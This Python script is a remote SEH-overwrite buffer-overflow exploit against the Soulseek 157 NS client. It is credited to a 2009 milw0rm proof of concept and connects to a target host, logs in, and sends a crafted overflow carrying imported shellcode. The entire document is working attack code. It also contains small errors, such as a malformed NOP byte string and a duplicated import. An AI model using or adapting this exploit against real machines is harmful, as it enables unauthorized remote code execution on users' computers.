#!/usr/bin/python
#[x] Bug :Soulseek 157 NS Remote Seh Overwrite Exploit
#[x] Credits & poc from : http://www.milw0rm.com/exploits/8777
#[x] Tested on : Windows Xp (sp3), Soulseek 157 NS 12d
#[x] The exploit attacks the user :"test4321"
import socket
from payload import buf
import socket
from time import *
def shell_attack(target_machine, target_port):


    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_machine,target_port))  # Change to Port 2240 for 156* branch

    request = b"\x48\x00\x00\x00\x01\x00\x00\x00\x08\x00\x00\x00"
    request += b"testt4321" # username
    request += b"\x08\x00\x00\x00"
    request += b"12345678" # password
    request += b"\xb5\x00\x00\x00\x20\x00\x00\x00"
    request += b"\x38\x65\x39\x31\x66\x37\x33\x30\x35\x35\x37\x31\x32\x35\x64\x37"
    request += b"\x34\x39\x32\x34\x62\x64\x66\x35\x63\x32\x39\x61\x36\x37\x64\x61"
    request += b"\x01\x00\x00\x00"

    s.send(request)
    sleep(1)

    # win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
   

    payload  = b"\x41" * (3084-len(buf))
    payload += buf
    payload += b"\xE9\xA4\xFE\xFF\xFF"
    payload += b"\90"*22
    payload += b"\xEB\xE3\x41\x42"
    payload += b"\x34\x14\x40\x00" # p/p/r->SoulSeek.exe
    payload += b"\x44" * 1423


    request2 = b"\x01\x0f\x00\x00\x2a\x00\x00\x00\x09\x00\x00\x00"
    request2 += b"testt4321"
    request2 += b"\xa4\x5a\x51\x44\xe8\x0e\x00\x00"
    request2 += payload

    s.send(request2)
    sleep(1)
    s.recv(1024)

    # milw0rm.com [2009-05-26]